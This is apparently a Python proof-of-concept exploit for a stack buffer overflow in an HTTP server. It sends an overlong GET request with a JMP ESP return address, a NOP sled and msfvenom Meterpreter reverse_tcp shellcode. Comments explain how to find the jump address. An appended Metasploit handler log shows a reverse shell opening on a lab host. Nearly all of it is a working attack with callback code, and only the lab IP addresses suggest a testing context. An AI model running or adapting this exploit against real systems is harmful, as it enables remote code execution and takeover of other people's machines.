#!/usr/bin/python

import socket, sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 80))

buffer = "GET "

buffer += "A" * 1787

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note the address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e"

buffer += "\x90" * 25

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.13 -f c -a x86 -b "\x00\x0d"
buffer += ("\xd9\xce\xba\x5a\xf7\x95\x09\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x54\x31\x56\x18\x03\x56\x18\x83\xc6\x5e\x15\x60\xf5\xb6\x5b"
"\x8b\x06\x46\x3c\x05\xe3\x77\x7c\x71\x67\x27\x4c\xf1\x25\xcb"
"\x27\x57\xde\x58\x45\x70\xd1\xe9\xe0\xa6\xdc\xea\x59\x9a\x7f"
"\x68\xa0\xcf\x5f\x51\x6b\x02\xa1\x96\x96\xef\xf3\x4f\xdc\x42"
"\xe4\xe4\xa8\x5e\x8f\xb6\x3d\xe7\x6c\x0e\x3f\xc6\x22\x05\x66"
"\xc8\xc5\xca\x12\x41\xde\x0f\x1e\x1b\x55\xfb\xd4\x9a\xbf\x32"
"\x14\x30\xfe\xfb\xe7\x48\xc6\x3b\x18\x3f\x3e\x38\xa5\x38\x85"
"\x43\x71\xcc\x1e\xe3\xf2\x76\xfb\x12\xd6\xe1\x88\x18\x93\x66"
"\xd6\x3c\x22\xaa\x6c\x38\xaf\x4d\xa3\xc9\xeb\x69\x67\x92\xa8"
"\x10\x3e\x7e\x1e\x2c\x20\x21\xff\x88\x2a\xcf\x14\xa1\x70\x87"
"\xd9\x88\x8a\x57\x76\x9a\xf9\x65\xd9\x30\x96\xc5\x92\x9e\x61"
"\x2a\x89\x67\xfd\xd5\x32\x98\xd7\x11\x66\xc8\x4f\xb0\x07\x83"
"\x8f\x3d\xd2\x3e\x95\xa9\x1d\x16\x94\x24\xf6\x65\x97\x27\x5a"
"\xe3\x71\x17\x32\xa3\x2d\xd7\xe2\x03\x9e\xbf\xe8\x8b\xc1\xdf"
"\x12\x46\x6a\x75\xfd\x3f\xc2\xe1\x64\x1a\x98\x90\x69\xb0\xe4"
"\x92\xe2\x31\x18\x5c\x03\x33\x0a\x88\x72\xbb\xd2\x48\x1f\xbb"
"\xb8\x4c\x89\xec\x54\x4e\xec\xdb\xfa\xb1\xdb\x5f\xfc\x4d\x9a"
"\x69\x76\x7b\x08\xd6\xe0\x83\xdc\xd6\xf0\xd5\xb6\xd6\x98\x81"
"\xe2\x84\xbd\xce\x3e\xb9\x6d\x5a\xc1\xe8\xc2\xcd\xa9\x16\x3c"
"\x39\x76\xe8\x6b\x3a\x71\x16\xe9\x1e\xda\x7f\x11\x1e\xda\x7f"
"\x7b\x9e\x8a\x17\x70\xb1\x25\xd8\x79\x18\x6e\x70\xf3\xcc\xdc"
"\xe1\x04\xc5\x81\xbf\x05\xe9\x19\xa9\x8b\x0e\x9e\xd6\x6d\x33"
"\x48\xef\x1b\x74\x48\x54\x13\xcf\xed\xfd\xbe\x2f\xa1\xfe\xea")

buffer += "C" * 300

buffer += " HTTP/1.1\r\n\r\n"

sock.send(buffer)

sock.close()

"""
msfconsole 
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


Love leveraging credentials? Check out bruteforcing
in Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.12.23-dev                         ]
+ -- --=[ 1577 exploits - 907 auxiliary - 272 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options 

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit 

[*] Started reverse TCP handler on 192.168.1.13:4444 
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.12
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.12:1159) at 2017-02-24 15:04:21 -0500

meterpreter > getuid
Server username: ABC\kanishka
meterpreter > 
"""
